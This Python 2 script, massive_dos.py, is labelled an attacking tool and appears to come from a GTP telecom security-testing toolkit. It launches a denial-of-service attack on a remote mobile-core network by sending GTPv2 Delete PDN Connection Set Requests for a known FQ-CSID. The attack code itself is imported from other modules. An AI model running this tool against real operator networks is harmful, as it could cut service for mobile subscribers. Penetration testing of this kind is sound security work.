#!/usr/bin/env python
# encoding: utf-8
#       massive_dos.py
#       
#       Copyright 2018 Rosalia d'Alessandro 
#                     
#

#       Redistribution and use in source and binary forms, with or without
#       modification, are permitted provided that the following conditions are
#       met:
#       
#       * Redistributions of source code must retain the above copyright
#         notice, this list of conditions and the following disclaimer.
#       * Redistributions in binary form must reproduce the above
#         copyright notice, this list of conditions and the following disclaimer
#         in the documentation and/or other materials provided with the
#         distribution.
#       * Neither the name of the  nor the names of its
#         contributors may be used to endorse or promote products derived from
#         this software without specific prior written permission.
#       
#       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#       "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#       LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#       A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#       OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#       SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#       LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#       DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#       THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#       (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#
import os
import sys
from optparse import OptionParser
from gtp_v2_core.utilities.configuration_parser import parseConfigs
from commons.message_handler import MessageHandler
from commons.globals import message_queue

__all__ = []
__version__ = 0.1


GTP_PORT = 2123
DEFAULT_MSG_FREQ = 20
DEFAULT_SLEEPTIME = 1
DEBUG = 0


##
## ATTACKING TOOL 
## 
## @brief      Main file to execute the script.
## 
## This file can test a DoS attack sending a Delete PDN Connection Set Request 
## (101) for a specific FQ-CSID.FQ-CSID is calculated using node type id, mcc, mnc and source ip 
## provided in the config file.
## 
## Use the -h option to enter the help menu and determine what to do.
## 
## Basic usage examples:
##      * $ python massive_dos.py -v -c conf_file.cnf [-c conf2.cnf ...] -r <remote ip> 
#            act as a client connecting to <remote-host-ip>
##      
##      * $ python massive_dos.py -lv  -c conf_file.cnf [-c conf2.cnf ...] -r <remote ip>
##      
##           act as a server listening on 0.0.0.0 and accepting replies from <remote-host-ip>
##
## Example configuration file: MassiveDos.cnf
## Pre-conditions: known valid FQ-CSID

def main(argv=None):
    '''Command line options.'''

    program_name = os.path.basename(sys.argv[0])
    program_version = "v0.1"

    program_version_string = '%%prog %s' % (program_version)

    program_license = "Copyright 2017 Rosalia d'Alessandro\
                Licensed under the Apache License 2.0\
                nhttp://www.apache.org/licenses/LICENSE-2.0"

    if argv is None:
        argv = sys.argv[1:]
    lstn = None
    try:
        # setup option parser
        parser = OptionParser(version=program_version_string, description=program_license)
        parser.add_option("-v", "--verbose", dest="verbose", action="count", help="set verbosity level [default: %default]")

        parser.add_option("-c", "--config", dest="config_file", help="the configuration file")
        parser.add_option("-r", "--remote_net", dest="remote_net", 
                          help="remote network e.g. 10.0.0.0/24, 10.0.0.1/32") 
        parser.add_option("-l", "--listening", dest = "listening_mode", 
                          action = "count", help = "start also a GTP_C listener")       
        
        # set defaults
        parser.set_defaults(listening_mode=False,
                            config_file="../config/MassiveDoS.cnf", 
                            verbose = False)

        # process options
        (opts, args) = parser.parse_args(argv)
        is_verbose = False
        listening_mode = opts.listening_mode
          

        msg_freq = DEFAULT_SLEEPTIME
        remote_net = opts.remote_net
        sleep_time = DEFAULT_SLEEPTIME
      
        if listening_mode and  remote_net == None:
            print "remote network (e.g. 10.0.0.0/24, 10.0.0.1/32) is required"
            return
        # MAIN BODY #
        if opts.config_file == "" :
            print "Error: missed config file"
            return            
  
        config = parseConfigs(opts.config_file)
 
        msgs = config.get_unpacked_messages()
       
        lstn = MessageHandler(messages = msgs, peer = remote_net, 
                              isVerbose = is_verbose, 
                              listening_mode = listening_mode,
                              msgs_freq = msg_freq, wait_time = sleep_time)  
        if lstn : 
            lstn.daemon = True
            lstn.start()
            lstn.join()
            lstn.stop()
        print "Sent %d GTPV2 messages"%len(message_queue)
       
    except Exception, e:
        indent = len(program_name) * " "
        sys.stderr.write(program_name + ": " + repr(e) + "\n")
        sys.stderr.write(indent + "  for help use --help")
        print "Exception %s"%str(e)
        if lstn : 
            lstn.stop()        
        return 2
if __name__ == "__main__":
    if DEBUG:
        sys.argv.append("-v")
    sys.exit(main())
